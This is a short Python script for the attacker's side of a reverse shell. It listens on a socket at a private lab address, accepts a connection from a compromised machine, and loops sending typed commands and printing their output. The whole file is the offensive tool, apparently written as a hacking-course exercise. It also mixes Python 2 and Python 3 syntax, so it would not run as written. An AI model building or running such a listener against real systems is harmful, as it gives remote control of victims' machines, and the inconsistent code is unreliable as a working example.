import socket

class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
        listener.bind((ip,port))
        listener.listen(0)
        print(f"Listening on port {port}...")

        (self.connection,address) = listener.accept()

        print("Listening established..." + str(address))

    def command_execution(self,command_input):
        self.connection.send(command_input)
        return self.connection.recv(1024)

    def start_listener(self):
        while True:
            command_input = raw_input("Enter command: ")
            command_output = self.command_execution(command_input)
            print(command_output)

socket_listener = SocketListener("10.0.2.10",8080)
socket_listener.start_listener()